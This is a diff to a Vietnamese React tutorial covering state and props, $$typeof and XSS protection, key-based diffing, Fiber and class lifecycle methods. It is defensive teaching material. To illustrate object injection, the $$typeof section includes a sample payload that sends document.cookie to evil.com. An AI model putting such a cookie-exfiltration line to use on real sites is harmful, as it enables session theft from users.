@@ -178,14 +178,21 @@ function UserCard({ user }) {
 
 ### 2.3. State và Props — phân biệt rạch ròi
 
-Đây là 2 khái niệm người mới hay nhầm lẫn nhất, nên cần một bảng so sánh rõ ràng:
+Đây là 2 khái niệm người mới hay nhầm lẫn nhất. Cách phân biệt nhanh: **state** là dữ liệu component *tự quản lý*, **props** là dữ liệu *được truyền từ ngoài vào*.
 
 | Tiêu chí | State | Props |
-|---|---|---|
+|----------|-------|-------|
 | Ai sở hữu | Component tự quản lý (nội bộ) | Được truyền từ component cha |
-| Có thể thay đổi trong component không | Có (`setState`) | Không (read-only) |
-| Ví dụ | Nội dung ô input đang gõ, trạng thái menu mở/đóng | `user`, `title`, `onClick` được cha truyền xuống |
-| Ai chịu trách nhiệm khi cần đổi giá trị | Chính component đó | Component **cha** (component con chỉ có thể "xin" qua callback) |
+| Thay đổi được không | Có — qua `setState` / `useState` setter | Không — read-only, chỉ cha mới đổi được |
+| Khi đổi thì sao | Component re-render | Component re-render (nếu giá trị thật sự khác) |
+| Ví dụ điển hình | Nội dung ô input đang gõ, menu mở/đóng, tab đang chọn | `user`, `title`, `onClick`, `disabled` được cha truyền xuống |
+| Ai chịu trách nhiệm khi cần đổi | Chính component đó | Component cha — con chỉ "xin" qua callback |
+
+**Câu hỏi thực tế để phân biệt:** *"Dữ liệu này có thể bị thay đổi từ bên trong component này không?"*
+- Có → **state** (`useState`)
+- Không, chỉ do cha truyền vào → **props**
+
+**Ví dụ:** ô tìm kiếm — text người dùng đang gõ là **state** (component tự quản lý khi người dùng nhập), còn `placeholder` hay `onSearch` là **props** (cha quyết định, con chỉ đọc và gọi lại).
 
 ```jsx
 import { useState } from "react";
@@ -338,32 +345,143 @@ Mở Console, bạn sẽ thấy đúng object này hiện ra — không phải c
 
 ### 3.5. `$$typeof: Symbol(react.element)` — "con dấu" chống giả mạo
 
-Object JSX không phải object "bình thường hoàn toàn" — React tự gắn thêm một thuộc tính:
+####  Vấn đề đặt ra: React cần nhận biết element "thật" như thế nào?
+
+Khi React nhận được một object để render, nó cần trả lời: *"Object này có phải do chính React tạo ra, hay ai đó đang cố tình nhét vào?"*
+
+Để giải quyết, React tự động gắn thêm một thuộc tính đặc biệt vào **mọi** React element:
+
 ```javascript
-$$typeof: Symbol.for('react.element')
+// Khi bạn viết JSX:
+const element = <h1>Hello</h1>;
+
+// React tạo ra object này (đã đơn giản hóa):
+{
+  $$typeof: Symbol.for('react.element'),  // ← "con dấu xác thực"
+  type: 'h1',
+  props: { children: 'Hello' },
+  key: null,
+  ref: null
+}
 ```
 
-Đây đóng vai trò như "con dấu xác thực": React dựa vào nó để biết object này thực sự do chính React sinh ra (qua `createElement`/`_jsx`), không phải object ngẫu nhiên hay giả mạo.
+`$$typeof` đóng vai trò như **con dấu xác thực chính thức** — React dựa vào nó để biết object này thực sự do `createElement`/`_jsx` sinh ra, không phải object ngẫu nhiên từ nguồn khác.
 
-**Vì sao Symbol lại có tác dụng chống giả mạo:** `Symbol` trong JavaScript là kiểu dữ liệu **duy nhất tuyệt đối** — không thể serialize qua JSON, không thể tạo lại giống hệt từ bên ngoài. Nếu server trả về dữ liệu JSON có dạng:
+---
+
+####  Tại sao Symbol không thể bị làm giả?
+
+`Symbol` trong JavaScript có một đặc tính **duy nhất và tuyệt đối**: **không thể serialize qua JSON**.
+
+```javascript
+// Thử JSON.stringify một Symbol:
+const obj = { key: Symbol.for('react.element'), value: 42 };
+JSON.stringify(obj);
+// → '{"value":42}'   ← Symbol bị BỎ QUA hoàn toàn, không xuất hiện!
+
+// Thử JSON.parse ngược lại — không thể tạo lại:
+JSON.parse('{"$$typeof": "Symbol.for(\'react.element\')"}');
+// → { $$typeof: "Symbol.for('react.element')" }  ← chỉ là chuỗi text, không phải Symbol!
+```
+
+Điều này tạo ra một "bức tường" tự nhiên: **bất kỳ dữ liệu nào đến từ mạng (JSON) đều không thể mang theo Symbol thật**.
+
+---
+
+####  Kịch bản tấn công thực tế: Object injection
+
+Giả sử server bị tấn công và trả về JSON độc hại có dạng một React element:
+
 ```json
-{ "type": "h1", "props": { "children": "Hacked" } }
+{
+  "type": "script",
+  "props": { "children": "fetch('https://evil.com?c='+document.cookie)" }
+}
 ```
-object này **thiếu** `$$typeof: Symbol.for('react.element')` (vì Symbol không đi qua JSON được), nên khi React duyệt cây để render, nó sẽ nhận ra đây không phải element hợp lệ và từ chối xử lý như UI thật.
 
-**Lưu ý quan trọng — đây KHÔNG phải cơ chế chống XSS:** `$$typeof` chỉ giúp React phân biệt "đúng element React" và "object lạ", không liên quan đến việc escape nội dung. Việc chống XSS thực sự đến từ hành vi mặc định của React: **tự động escape mọi nội dung khi render**.
+**Nếu không có `$$typeof`:** React có thể bị lừa tưởng đây là element hợp lệ → render `<script>` thật → XSS.
+
+**Với `$$typeof`:** Object từ JSON này **không có** `$$typeof: Symbol(react.element)` (vì Symbol không đi qua JSON được). Khi React kiểm tra, nó phát hiện ngay đây không phải element hợp lệ → **từ chối render như UI**, chỉ hiển thị như text vô hại.
+
+```
+┌──────────────────────────────────────────────────────────────┐
+│                      Luồng kiểm tra của React                │
+│                                                              │
+│  Nguồn gốc          Object nhận được        Kết quả         │
+│  ──────────         ────────────────        ────────         │
+│                     { type, props,                           │
+│  Server JSON   →      (thiếu $$typeof) }  →  Từ chối      │
+│  (bị hack)          Kiểm tra: không có        render như text│
+│                     Symbol → không hợp lệ                   │
+│                                                              │
+│                     { $$typeof: Symbol,                      │
+│  createElement() →    type, props }       →  Cho phép     │
+│  (code của bạn)     Kiểm tra: có Symbol      render bình    │
+│                     → hợp lệ                thường          │
+└──────────────────────────────────────────────────────────────┘
+```
+
+---
+
+####  Lưu ý quan trọng: `$$typeof` ≠ chống XSS
+
+Đây là điểm dễ nhầm lẫn nhất. Hai cơ chế này **hoàn toàn khác nhau**:
+
+| Cơ chế | Bảo vệ chống lại | Cách hoạt động |
+|--------|-----------------|----------------|
+| `$$typeof` | Object injection (element giả mạo) | Kiểm tra con dấu Symbol khi React duyệt cây |
+| Auto-escape | XSS từ nội dung người dùng | Dùng `textContent` thay vì `innerHTML` |
+
+**Auto-escape** mới là lớp bảo vệ XSS thực sự:
 
 ```jsx
+// Người dùng nhập vào ô tìm kiếm:
 const userInput = "<script>alert('hacked')</script>";
-return <div>{userInput}</div>;
-```
-React sẽ hiển thị đúng nguyên văn chuỗi này như **text**, không biến thành thẻ `<script>` thực thi được — an toàn theo mặc định, đúng như mục tiêu ban đầu ở phần 1.1.
 
-Chỉ khi bạn **chủ động bypass** bằng:
+// Bạn render bình thường:
+return <div>{userInput}</div>;
+//  React gán bằng textContent → hiển thị đúng nguyên văn như text
+//  KHÔNG tạo thẻ <script> thật → an toàn tuyệt đối
+```
+
+Trong DOM thật, React tương đương với:
+```javascript
+div.textContent = userInput;  // ← an toàn
+// chứ KHÔNG phải:
+div.innerHTML = userInput;    // ← nguy hiểm
+```
+
+**Nhưng nếu bạn tự tay bypass:**
+
 ```jsx
+//  Tắt bảo vệ mặc định — NGUY HIỂM nếu không sanitize
 <div dangerouslySetInnerHTML={{ __html: userInput }} />
 ```
-thì React mới chèn thẳng chuỗi vào DOM như HTML thật — và lỗ hổng XSS y hệt thời kỳ ghép chuỗi HTML server-side có thể quay lại, vì bạn đã tự tay tắt lớp bảo vệ mặc định. Chỉ dùng API này khi bạn hoàn toàn chắc chắn nội dung đã được sanitize (ví dụ qua thư viện như DOMPurify).
+
+Cái tên `dangerouslySetInnerHTML` không phải ngẫu nhiên — React đặt tên dài và có chữ **"dangerously"** để buộc developer phải suy nghĩ kỹ trước khi dùng. Khi dùng API này, React gọi `innerHTML` thật → `<script>` thực thi → XSS quay lại y hệt thời ghép chuỗi HTML server-side.
+
+> **Quy tắc vàng:** Chỉ dùng `dangerouslySetInnerHTML` khi bạn **chắc chắn 100%** nội dung đã được sanitize, ví dụ qua thư viện [DOMPurify](https://github.com/cure53/DOMPurify):
+> ```javascript
+> import DOMPurify from 'dompurify';
+> <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
+> ```
+
+---
+
+####  Tóm tắt: 3 lớp bảo vệ của React
+
+```
+Mối đe dọa                  Lớp bảo vệ                 Cơ chế kỹ thuật
+────────────────────────────────────────────────────────────────────────
+Object injection         →  $$typeof Symbol         →  Kiểm tra Symbol trước khi render
+(server trả object lạ)      (con dấu xác thực)
+
+XSS từ nội dung          →  Auto-escape             →  textContent thay vì innerHTML
+(user input độc hại)        (mặc định bật)
+
+Bypass có chủ ý          →  Tên API cảnh báo        →  "dangerously..." + dùng DOMPurify
+                             + sanitize thủ công         để lọc HTML độc hại
+```
 
 ---
 
@@ -400,21 +518,47 @@ Khi `messages` có thêm 1 phần tử, component chạy lại (bước 2), tạ
 
 ### 4.3. Thuật toán Diffing: Heuristic O(n) thay vì O(n³)
 
-So sánh 2 cây tổng quát trong khoa học máy tính có độ phức tạp lý thuyết lên tới O(n³) — không thể chấp nhận với UI có hàng nghìn node. React chọn cách thực dụng hơn: dùng **2 giả định heuristic** để đưa bài toán về gần O(n).
+####  Tại sao không so sánh cây tổng quát?
 
-**Giả định 1 — khác loại (type) thì coi như khác hoàn toàn cây con:**
+So sánh 2 cây tổng quát trong khoa học máy tính có độ phức tạp lý thuyết lên tới **O(n³)** — nghĩa là với 1000 node, máy cần thực hiện **1 tỷ phép so sánh**. Điều này hoàn toàn không thể chấp nhận với UI thay đổi liên tục.
+
+React chọn hướng thực dụng: đánh đổi tính chính xác tuyệt đối lấy **hiệu năng gần O(n)** bằng cách dùng **2 giả định heuristic** — những quy tắc đúng với ~99% trường hợp thực tế.
+
+---
+
+####  Giả định 1 — Khác `type` = khác hoàn toàn cây con
+
+Nếu node gốc đổi loại (`div` → `span`, `div` → `MyComponent`...), React **không cố so sánh bên trong** mà hủy toàn bộ subtree cũ và dựng mới.
 
 ```jsx
 // Render lần 1:
-<div><Counter /></div>
+<div>
+  <Counter />   {/* Counter có state: count = 5 */}
+</div>
 
-// Render lần 2 (đổi div thành span):
-<span><Counter /></span>
+// Render lần 2 — chỉ đổi div → span:
+<span>
+  <Counter />
+</span>
 ```
 
-Vì `div` khác `span`, React **không** cố so sánh sâu bên trong — nó hủy toàn bộ subtree cũ (bao gồm cả `Counter`, mất luôn state của `Counter`) và dựng subtree mới hoàn toàn. Đây là lý do đổi loại phần tử gốc của một cây con là thao tác "đắt" — nó không tận dụng được diff thông minh.
+**Điều xảy ra:**
 
-**Giả định 2 — `key` trong danh sách để nhận diện danh tính:**
+```
+Cây cũ            Cây mới           Hành động của React
+─────────         ─────────         ──────────────────────────────
+div               span               type khác → HỦY toàn bộ subtree cũ
+└─ Counter        └─ Counter          Counter mất luôn state (count = 0 lại)
+   count=5           count=0          Dựng subtree mới hoàn toàn
+```
+
+> **Hệ quả thực tế:** đổi loại phần tử bao ngoài là thao tác "đắt" — mọi state của component con đều bị reset. Tránh đổi `type` ở cấp trên nếu muốn giữ state bên trong.
+
+---
+
+####  Giả định 2 — `key` trong danh sách để nhận diện danh tính
+
+Khi render danh sách, React cần biết "phần tử nào là phần tử nào" sau mỗi lần cập nhật. `key` chính là "chứng minh thư" để React nhận diện — không có key ổn định, React chỉ còn biết dựa vào **vị trí** (index), và đó là nguồn gốc của lỗi.
 
 ```jsx
 // KHÔNG NÊN — dùng index làm key
@@ -424,157 +568,363 @@ Vì `div` khác `span`, React **không** cố so sánh sâu bên trong — nó h
 {items.map(item => <Item key={item.id} data={item} />)}
 ```
 
-**Ví dụ minh họa cụ thể vì sao dùng `index` là sai:** giả sử danh sách ban đầu là `[A, B, C]` (index 0,1,2), sau đó bạn **xóa A**, còn lại `[B, C]`. Nếu dùng `index` làm key: phần tử ở vị trí 0 trước đó là A (key=0), giờ là B (key=0) — React thấy "key=0 vẫn còn, nội dung đổi từ A thành B" nên nó **cập nhật nội dung** của DOM node cũ thay vì hiểu đúng bản chất là "A bị xóa, B và C dịch lên". Hậu quả: nếu mỗi `Item` có state nội bộ (ví dụ ô input đang gõ dở), state đó sẽ bị "dính" sai vào nhầm item sau khi xóa — một lỗi rất khó phát hiện vì UI trông vẫn "đúng" ở cái nhìn đầu tiên.
+---
 
-Nếu dùng `key={item.id}` (id ổn định không đổi theo vị trí), React nhận diện chính xác: "A biến mất, B và C giữ nguyên danh tính, chỉ đổi vị trí" — xóa đúng 1 DOM node của A, giữ nguyên state của B và C.
+**Tình huống cụ thể: ứng dụng danh sách công việc, mỗi task có ô input ghi chú riêng**
+
+Giả sử bạn có 3 task, mỗi task là một component có ô `<input>` — người dùng đã gõ ghi chú vào từng ô:
+
+```
+Danh sách ban đầu (key=index):
+
+  [key=0]  Task A  | input: "ghi chú cho A"   ← người dùng đã gõ
+  [key=1]  Task B  | input: "ghi chú cho B"
+  [key=2]  Task C  | input: "ghi chú cho C"
+```
+
+Bây giờ người dùng **xóa Task A**. Array còn `[B, C]`. React render lại:
+
+```
+Danh sách sau xóa (key=index):
+
+  [key=0]  Task B  | input: ???
+  [key=1]  Task C  | input: ???
+```
+
+React nhìn vào key: `key=0` vẫn tồn tại → nó nghĩ đây vẫn là **cùng một component cũ** (component của Task A trước đó), chỉ là `data` prop thay đổi sang Task B. Vì vậy React **không unmount/remount** component, chỉ cập nhật prop. Kết quả: DOM node cũ của Task A — bao gồm cả state ô input — được **tái sử dụng** cho Task B.
+
+```
+Điều người dùng thấy:
+
+  [key=0]  Task B  | input: "ghi chú cho A"   ← SAI! Ghi chú của A dính vào B
+  [key=1]  Task C  | input: "ghi chú cho B"   ← SAI! Ghi chú của B dính vào C
+```
+
+UI trông vẫn "đúng" về nội dung task (tên task hiển thị đúng B và C), nhưng **state nội bộ của ô input bị trượt sang** — lỗi rất khó phát hiện trong code review vì không có gì "trông sai" trên màn hình ở cái nhìn đầu tiên.
+
+---
+
+**Dùng `key={item.id}` — React nhận diện chính xác:**
+
+```
+Danh sách ban đầu (key=id):
+
+  [key="id-a"]  Task A  | input: "ghi chú cho A"
+  [key="id-b"]  Task B  | input: "ghi chú cho B"
+  [key="id-c"]  Task C  | input: "ghi chú cho C"
+```
+
+Sau khi xóa Task A, array còn `[B, C]`:
+
+```
+Danh sách sau xóa (key=id):
+
+  [key="id-b"]  Task B  | input: "ghi chú cho B"   ← giữ nguyên state
+  [key="id-c"]  Task C  | input: "ghi chú cho C"   ← giữ nguyên state
+```
+
+React thấy `key="id-a"` biến mất → **unmount đúng component của A**. `key="id-b"` và `key="id-c"` vẫn còn → B và C được giữ nguyên hoàn toàn, state ô input không hề bị đụng tới.
+
+---
+
+**Quy tắc chọn key:**
+
+| Tình huống | Nên dùng | Lý do |
+|------------|----------|-------|
+| Data từ server (users, posts, tasks...) | `item.id` từ database | Id ổn định, duy nhất, không đổi theo vị trí |
+| Danh sách tĩnh không bao giờ reorder/xóa/thêm | `index` tạm chấp nhận | Vị trí không thay đổi nên không gây lỗi |
+| Danh sách có thể reorder, xóa, thêm | `item.id` hoặc tạo id bằng `crypto.randomUUID()` | Index trượt → lỗi state như trên |
+| Không bao giờ | Giá trị ngẫu nhiên mỗi render (`Math.random()`) | Key đổi mỗi lần → React unmount/remount toàn bộ, mất state và hiệu năng tệ hơn cả không có key |
+
+---
+
+####  Tóm tắt 2 heuristic
+
+```
+Heuristic              Quy tắc                        Hệ quả nếu vi phạm
+─────────────────────────────────────────────────────────────────────────
+Khác type →            Hủy toàn bộ cây con cũ,        State component con
+khác hoàn toàn         dựng cây mới                   bị reset bất ngờ
+
+key trong danh sách    Nhận diện danh tính qua key,   State "dính" sai item,
+→ nhận diện chính xác  không qua vị trí               lỗi âm thầm khó debug
+```
+
+---
 
 ### 4.4. Từ Stack Reconciler đến React Fiber
 
-**Trước React 16 — Stack Reconciler:** duyệt cây VDOM bằng đệ quy dựa trên call stack của JS, chạy **đồng bộ hoàn toàn** — một khi bắt đầu render, không thể dừng giữa chừng. Nếu cây UI đủ lớn, main thread bị chiếm dụng liên tục trong lúc render, khiến scroll/click/animation bị giật hoặc treo.
+####  Vấn đề của Stack Reconciler (trước React 16)
 
-**Từ React 16 — React Fiber:** viết lại toàn bộ cơ chế reconciliation để có thể **chia nhỏ công việc** và **tạm dừng/tiếp tục** render.
+Stack Reconciler duyệt cây VDOM bằng **đệ quy thuần túy** — dựa hoàn toàn vào call stack của JavaScript:
+
+```
+render(App)
+  └─ render(Header)
+       └─ render(Nav)
+            └─ render(NavItem) × 50
+  └─ render(Main)
+       └─ render(ArticleList)
+            └─ render(Article) × 100
+                 └─ render(Comment) × 20 each ...
+```
+
+Khi bắt đầu đệ quy, **JavaScript không thể dừng giữa chừng** — nó phải chạy hết toàn bộ cây mới xong. Với UI lớn (hàng nghìn node), main thread bị chiếm dụng liên tục hàng chục mili-giây → scroll giật, click không phản hồi, animation không mượt.
+
+```
+Main thread timeline (Stack Reconciler):
+─────────────────────────────────────────────────────
+[==== render toàn bộ cây (50ms) ====][user input][paint]
+         ↑ không thể dừng ở đây       ↑ phải chờ!
+```
+
+####  React Fiber (từ React 16): Chia nhỏ công việc
+
+Fiber viết lại toàn bộ reconciler, biến mỗi node thành một **Fiber Node** — object JS có con trỏ liên kết, không phụ thuộc call stack:
+
+```javascript
+// Cấu trúc Fiber Node (đơn giản hóa):
+{
+  tag: 'div',          // loại node
+  key: null,
+  props: { ... },
+  stateNode: domNode,  // tham chiếu DOM thật
+  child: FiberNode,    // con đầu tiên
+  sibling: FiberNode,  // anh/chị em kế tiếp
+  return: FiberNode,   // cha
+  // ... priority, lanes, effects...
+}
+```
+
+Nhờ cấu trúc liên kết này, React có thể **dừng tại bất kỳ node nào** và tiếp tục sau:
+
+```
+Main thread timeline (React Fiber):
+──────────────────────────────────────────────────────────
+[render A–B][pause → user click][render C–D][paint]
+      ↑ nhường main thread        ↑ tiếp tục
+```
 
 | Tiêu chí | Stack Reconciler (< 16) | Fiber Reconciler (16+) |
-|---|---|---|
-| Cách duyệt cây | Đệ quy theo call stack | Cấu trúc Fiber Node liên kết cha–con–anh em |
-| Mô hình thực thi | Đồng bộ hoàn toàn | Chia nhỏ thành nhiều bước (incremental) |
-| Có thể dừng giữa chừng | Không | Có (pause / resume / hủy) |
-| Ảnh hưởng main thread | Dễ block khi xử lý lớn | Giảm block nhờ xen kẽ công việc |
-| Ưu tiên cập nhật | Gần như không có | Có thể gán priority cho từng update |
-| Nền tảng cho | — | Concurrent Rendering |
+|----------|------------------------|------------------------|
+| Cách duyệt cây | Đệ quy theo call stack | Fiber Node liên kết cha–con–anh em |
+| Mô hình thực thi | Đồng bộ, không thể dừng | Chia nhỏ thành nhiều chunk (incremental) |
+| Có thể tạm dừng |  Không |  Có (pause / resume / hủy) |
+| Ảnh hưởng main thread | Dễ block khi cây lớn | Xen kẽ công việc, giảm block |
+| Ưu tiên cập nhật | Gần như không có | Gán priority cho từng update |
+| Nền tảng cho | — | Concurrent Rendering, Suspense, Transitions |
 
-Mỗi node trong Fiber là một **Fiber Node** — object JS chứa `tag`, `key`, props, state, cùng con trỏ tới node cha/con/anh em. Nhờ cấu trúc liên kết này (thay vì phụ thuộc call stack), React có thể dừng việc duyệt tại bất kỳ node nào, nhường main thread cho việc xử lý tương tác người dùng (ưu tiên cao hơn), rồi quay lại tiếp tục render sau — cơ chế này gọi là **time slicing**, nền tảng cho Concurrent Rendering ở các bản React mới.
-## 5. Vòng Đời Component Và Sự Ra Đời Của Hooks
+####  Time Slicing — cơ chế xen kẽ công việc
+
+Fiber chia công việc render thành các **chunk nhỏ**. Sau mỗi chunk, React kiểm tra: "Có tương tác nào ưu tiên cao hơn không?" Nếu có (user click, keypress...), React **nhường main thread** để xử lý tương tác trước, rồi quay lại render sau — gọi là **time slicing**.
+
+```
+Không có time slicing (Stack):       Có time slicing (Fiber):
+─────────────────────────────         ──────────────────────────────────────
+[======= render (100ms) =======]      [chunk][click!][chunk][chunk][paint]
+[click bị delay 100ms!]               [click phản hồi ngay lập tức ]
+```
+
+Đây là nền tảng cho **Concurrent Rendering** ở React 18+, cho phép React làm nhiều việc song song: render nền ở mức thấp ưu tiên trong khi vẫn giữ UI phản hồi mượt mà với tương tác người dùng.
+## 5. Vòng Đời Component
 
 ### 5.1. Ba giai đoạn vòng đời
 
 Mỗi component từ lúc xuất hiện đến lúc bị gỡ bỏ đều trải qua 3 giai đoạn:
 
-- **Mounting (khởi tạo):** component lần đầu được thêm vào DOM.
-- **Updating (cập nhật):** component render lại do state/props đổi.
-- **Unmounting (hủy bỏ):** component bị gỡ khỏi DOM.
-
-### 5.2. Vì sao Class Component bộc lộ hạn chế
-
-Trước Hooks, chỉ Class Component mới quản lý được state và vòng đời, thông qua các lifecycle method:
-
-```jsx
-class WindowWidthLogger extends React.Component {
-  componentDidMount() {
-    // chạy sau lần render đầu tiên — nơi "đăng ký" sự kiện
-    window.addEventListener('resize', this.handleResize);
-  }
-
-  componentWillUnmount() {
-    // chạy trước khi component bị hủy — nơi "dọn dẹp"
-    window.removeEventListener('resize', this.handleResize);
-  }
-
-  handleResize = () => { /* ... */ };
-
-  render() {
-    return <div>...</div>;
-  }
-}
+```
+                  Component được tạo
+                        |
+                        v
+              ┌─────────────────────┐
+              │      MOUNTING       │  ← lần đầu được thêm vào DOM
+              │  render → DOM thật  │
+              └─────────┬───────────┘
+                        |
+                        v
+              ┌─────────────────────┐
+              │      UPDATING       │  ← state/props đổi → render lại
+              │  render lại nhiều   │     (có thể lặp nhiều lần)
+              │  lần tùy thay đổi   │
+              └─────────┬───────────┘
+                        |
+                        v
+              ┌─────────────────────┐
+              │     UNMOUNTING      │  ← bị gỡ khỏi DOM
+              │  dọn dẹp side effect│
+              └─────────────────────┘
 ```
 
-**Vấn đề cụ thể:** logic "đăng ký sự kiện resize" và logic "hủy đăng ký" **liên quan chặt chẽ với nhau** (cùng nói về 1 sự kiện), nhưng lại bị **tách rời** thành 2 lifecycle method nằm cách xa nhau trong file. Nếu component có 3 side effect khác nhau (resize listener, fetch API, subscribe websocket), code đăng ký của cả 3 sẽ bị trộn chung trong `componentDidMount`, và code dọn dẹp của cả 3 cũng bị trộn chung trong `componentWillUnmount` — rất dễ quên dọn nhầm hoặc thiếu dọn khi code phình to. Thêm vào đó, `this` trong JavaScript có ngữ cảnh (context) dễ gây lỗi (ví dụ quên `.bind(this)` hoặc quên dùng arrow function) — một nguồn bug rất phổ biến với người mới.
-
-### 5.3. Hooks (React 16.8): gom logic theo tính năng, không theo vòng đời
-
-Hooks cho phép Function Component quản lý state/lifecycle mà không cần class. Quan trọng hơn, nó cho phép **gom toàn bộ logic của một tính năng vào một chỗ**, thay vì rải theo lifecycle method:
-
-```jsx
-function WindowWidthLogger() {
-  useEffect(() => {
-    const handleResize = () => { /* ... */ };
-    window.addEventListener('resize', handleResize); // đăng ký
-
-    return () => {
-      window.removeEventListener('resize', handleResize); // dọn dẹp
-    };
-    // Cả "đăng ký" và "dọn dẹp" nằm CHUNG một khối — dễ đọc, dễ đối chiếu
-  }, []);
-
-  return <div>...</div>;
-}
-```
-
-**Custom Hooks** — điểm mạnh lớn nhất của Hooks — cho phép đóng gói một luồng xử lý hoàn chỉnh thành hàm riêng, tái sử dụng ở nhiều component.
-
-**Trường hợp CHƯA custom — logic bị lặp lại ở từng component:**
-
-Giả sử bạn cần biết chiều rộng cửa sổ ở cả `Sidebar` lẫn `Header` (2 component khác nhau, không liên quan gì đến nhau trong cây UI). Không có custom hook, bạn buộc phải copy-paste **y hệt** đoạn `useState` + `useEffect` vào từng nơi:
-
-```jsx
-function Sidebar() {
-  const [width, setWidth] = useState(window.innerWidth);
-
-  useEffect(() => {
-    const handleResize = () => setWidth(window.innerWidth);
-    window.addEventListener('resize', handleResize);
-    return () => window.removeEventListener('resize', handleResize);
-  }, []);
-
-  return <div>Sidebar rộng: {width}px</div>;
-}
-
-function Header() {
-  // Y HỆT đoạn code ở Sidebar — chỉ copy-paste lại
-  const [width, setWidth] = useState(window.innerWidth);
-
-  useEffect(() => {
-    const handleResize = () => setWidth(window.innerWidth);
-    window.addEventListener('resize', handleResize);
-    return () => window.removeEventListener('resize', handleResize);
-  }, []);
-
-  return <div>Header rộng: {width}px</div>;
-}
-```
-
-**Vấn đề cụ thể của cách làm này:**
-
-1. **Trùng lặp code:** cùng một logic (`addEventListener`, `removeEventListener`, `useState`) bị viết lại y hệt ở mọi nơi cần dùng. Có 5 component cần biết `width` thì có 5 bản copy giống hệt nhau.
-2. **Khó sửa đồng bộ:** nếu sau này bạn muốn đổi logic (ví dụ thêm debounce để tránh gọi `setWidth` quá dày khi resize liên tục), bạn phải nhớ sửa **ở tất cả các nơi** đã copy-paste. Quên sửa 1 chỗ là chỗ đó lỗi thời so với các chỗ còn lại — một nguồn bug rất phổ biến trong dự án thực tế khi code được copy qua nhiều file theo thời gian.
-3. **Test khó hơn:** logic bị dính chặt vào từng component, muốn viết unit test riêng cho "logic theo dõi chiều rộng cửa sổ" thì phải test gián tiếp qua UI của `Sidebar` hoặc `Header`, thay vì test độc lập logic đó.
-
-**Sau khi custom hóa — logic viết một lần, dùng lại nhiều nơi:**
-
-```jsx
-function useWindowWidth() {
-  const [width, setWidth] = useState(window.innerWidth);
-
-  useEffect(() => {
-    const handleResize = () => setWidth(window.innerWidth);
-    window.addEventListener('resize', handleResize);
-    return () => window.removeEventListener('resize', handleResize);
-  }, []);
-
-  return width;
-}
-
-// Dùng lại ở bất kỳ component nào, không cần copy-paste logic:
-function Sidebar() {
-  const width = useWindowWidth();
-  return <div>Sidebar rộng: {width}px</div>;
-}
-
-function Header() {
-  const width = useWindowWidth(); // gọi lại đúng logic, không copy code
-  return <div>Header rộng: {width}px</div>;
-}
-```
-
-So với bản "chưa custom" ở trên: nếu giờ cần thêm debounce, bạn chỉ sửa **đúng một chỗ** — bên trong `useWindowWidth` — và cả `Sidebar` lẫn `Header` đều tự động được hưởng thay đổi đó mà không cần đụng vào code của chúng.
-
-Class Component vẫn được React hỗ trợ, nhưng Hooks đã là chuẩn mực trong code React hiện đại.
+- **Mounting:** component lần đầu xuất hiện — React tạo DOM node, chạy effect sau khi vẽ xong.
+- **Updating:** state hoặc props thay đổi — component chạy lại hàm render, tính cây VDOM mới, diff, commit patch lên DOM.
+- **Unmounting:** component bị gỡ khỏi DOM — React chạy hàm cleanup để dọn dẹp (hủy timer, hủy subscription, abort request...).
 
 ---
 
-## 6. Các Hook Cốt Lõi
+### 5.2. Class Component và lifecycle method
 
-### 6.1. `useState` và `useReducer` — quản lý trạng thái
+Trước React 16.8, chỉ Class Component mới quản lý được state và vòng đời, thông qua các lifecycle method — mỗi method gắn với đúng một thời điểm trong vòng đời:
+
+```
+MOUNTING                    UPDATING                        UNMOUNTING
+────────                    ────────                        ──────────
+constructor()               static getDerivedStateFromProps()  componentWillUnmount()
+static getDerivedState...   shouldComponentUpdate()
+render()                    render()
+componentDidMount()         getSnapshotBeforeUpdate()
+                            componentDidUpdate()
+```
+
+**Các method phổ biến cần biết khi đọc code legacy:**
+
+| Method | Giai đoạn | Mục đích thực tế |
+|--------|-----------|------------------|
+| `constructor(props)` | Mounting | Khởi tạo state, bind method |
+| `render()` | Mounting + Updating | Trả về JSX — bắt buộc, phải là pure function |
+| `componentDidMount()` | Sau Mounting | Fetch data, đăng ký event listener, tương tác DOM |
+| `componentDidUpdate(prevProps, prevState)` | Sau Updating | Xử lý khi props/state đổi (so sánh với giá trị cũ để tránh vòng lặp vô tận) |
+| `componentWillUnmount()` | Trước Unmounting | Dọn dẹp: hủy timer, hủy subscription, abort request |
+| `shouldComponentUpdate(nextProps, nextState)` | Trước Updating | Tối ưu: trả về `false` để bỏ qua re-render không cần thiết |
+| `getDerivedStateFromProps()` | Mounting + Updating | Cập nhật state từ props — hiếm dùng, thường là dấu hiệu thiết kế sai |
+| `getSnapshotBeforeUpdate()` | Trước khi DOM thật cập nhật | Ghi lại giá trị DOM (ví dụ vị trí scroll) trước khi bị ghi đè |
+
+**Ví dụ thực tế — component theo dõi chiều rộng cửa sổ:**
+
+```jsx
+class WindowWidthLogger extends React.Component {
+  constructor(props) {
+    super(props);
+    this.state = { width: window.innerWidth };
+    this.handleResize = this.handleResize.bind(this); // phải bind this thủ công
+  }
+
+  componentDidMount() {
+    // Chạy SAU lần render đầu tiên — đây là nơi "đăng ký" sự kiện, fetch dữ liệu...
+    window.addEventListener('resize', this.handleResize);
+  }
+
+  componentDidUpdate(prevProps, prevState) {
+    // Chạy SAU mỗi lần re-render do state/props đổi
+    // prevProps/prevState là giá trị TRƯỚC khi cập nhật — dùng để so sánh
+    if (prevState.width !== this.state.width) {
+      document.title = `Cửa sổ rộng ${this.state.width}px`;
+    }
+  }
+
+  componentWillUnmount() {
+    // Chạy TRƯỚC khi component bị gỡ — đây là nơi "dọn dẹp"
+    window.removeEventListener('resize', this.handleResize);
+  }
+
+  handleResize() {
+    this.setState({ width: window.innerWidth });
+  }
+
+  render() {
+    return <div>Chiều rộng: {this.state.width}px</div>;
+  }
+}
+```
+
+**Hạn chế cụ thể của Class Component:**
+
+**1. Logic liên quan bị tách rời vì lifecycle:**
+
+Đăng ký `resize` nằm trong `componentDidMount`, hủy nằm trong `componentWillUnmount` — hai việc thuộc cùng một tính năng nhưng bị đặt ở hai nơi cách xa nhau. Khi component có 3 side effect khác nhau (resize, fetch API, subscribe websocket), code sẽ như sau:
+
+```jsx
+componentDidMount() {
+  window.addEventListener('resize', this.handleResize);   // [resize]
+  fetch('/api/data').then(...);                            // [fetch]
+  this.socket = new WebSocket('wss://...');                // [ws]
+  this.socket.onmessage = this.handleMessage;
+}
+
+componentWillUnmount() {
+  window.removeEventListener('resize', this.handleResize); // [resize]
+  // nhớ hủy fetch? nếu quên → memory leak khi unmount
